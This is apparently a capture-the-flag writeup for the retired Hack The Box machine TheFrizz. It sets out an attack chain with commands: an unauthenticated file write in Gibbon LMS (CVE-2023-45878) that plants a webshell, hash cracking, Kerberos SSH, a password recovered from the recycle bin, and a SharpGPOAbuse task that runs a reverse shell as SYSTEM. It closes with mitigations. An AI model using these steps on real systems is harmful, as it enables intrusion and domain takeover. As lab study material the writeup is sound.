---
machine: TheFrizz
os: Windows
difficulty: Medium
platform: Hack The Box
state: Retired
tags: [windows, active-directory, gibbon, cve-2023-45878, kerberos, gpo]
---

# TheFrizz — Hack The Box (Windows)

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

Gibbon LMS 25.0.00 is vulnerable to CVE-2023-45878, an arbitrary file write that drops a PHP webshell. Configuration leaks MySQL credentials and the user table stores salted SHA-256 hashes. After Kerberos logon, a deleted file in the recycle bin reveals another user's password; `Group Policy Creator Owners` allows a GPO with an immediate task as SYSTEM.

## Reconnaissance

```bash
nmap -Pn -sC -sV -p22,53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389 <IP>
```

- Windows DC with DNS, Kerberos, LDAP, SMB and WinRM.
- XAMPP/Apache on 80 with Gibbon LMS.
- The domain is `frizz.htb` and the DC is `frizzdc.frizz.htb`.

## Enumeration

- The root redirects to `frizzdc.frizz.htb`.
- Gibbon's footer shows version 25.0.00.
- `modules/Rubrics/rubrics_visualise_saveAjax.php` accepts `img` and `path` without authentication.

## Foothold

The `img` parameter is base64-decoded and written to the path supplied by `path`. A PHP webshell is placed in the webroot.

```bash
curl -s 'http://frizzdc.frizz.htb/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php' \
  --data-urlencode 'img=data:image/png;base64,<BASE64_PHP>' \
  --data-urlencode 'path=shell.php'
```

The webshell runs as `frizz\w.webservice`. `config.php` contains MySQL credentials; `gibbonperson` stores `sha256(salt . password)`, crackable with `hashcat -m 1420`.

## Lateral movement

`f.frizzle`'s password is recovered from the hash. The DC rejects password SSH, so a TGT is requested and GSSAPI is used.

```bash
kinit f.frizzle@FRIZZ.HTB
ssh -K -o GSSAPIAuthentication=yes f.frizzle@frizzdc.frizz.htb
```

The profile's recycle bin holds a renamed `.7z`. Inside, `wapt/conf/waptserver.ini` contains a base64 password for `m.schoolbus`.

```powershell
Copy-Item -LiteralPath 'C:\$Recycle.bin\<SID>\$RE2XMEG.7z' -Destination C:\Users\f.frizzle\Desktop\wapt.7z
```

## Privilege escalation

`m.schoolbus` is a member of `Group Policy Creator Owners`. `SharpGPOAbuse` creates a GPO with an immediate task that runs a reverse shell as SYSTEM when applied to the Domain Controllers OU.

```powershell
New-GPO -Name "ex$(Get-Date -UFormat %s)"
New-GPLink -Name $gname -Target "OU=Domain Controllers,DC=frizz,DC=htb"
.\SharpGPOAbuse.exe --addcomputertask --gponame $gname --command powershell.exe --arguments " -EncodedCommand <B64>"
gpupdate /force
```

## Evidence

- Webshell and `whoami` as `w.webservice`.
- Cracked hash and `f.frizzle` TGT.
- Recycle-bin file and `m.schoolbus` password, redacted.
- GPO, task and SYSTEM callback.
- Redacted flag.

## Lessons learned

- Deleted files can remain in the recycle bin for a long time.
- Kerberos-only authentication does not prevent access once a TGT is obtained.
- `Group Policy Creator Owners` is an escalation privilege, not just administration.

## Mitigations and detection

- Update Gibbon to 25.1.0 or later and authenticate the rubric endpoint.
- Do not reuse application passwords for domain accounts.
- Empty recycle bins and audit credentials in configuration files.
- Monitor GPO creation, immediate tasks and `gpupdate` on DCs.

## References

- <https://www.hackthebox.com/machines/TheFrizz>
- <https://github.com/GibbonEdu/core/security/advisories/GHSA-95w7-c498-4xv8>
- <https://nvd.nist.gov/vuln/detail/CVE-2023-45878>
- <https://attack.mitre.org/techniques/T1484/001/>
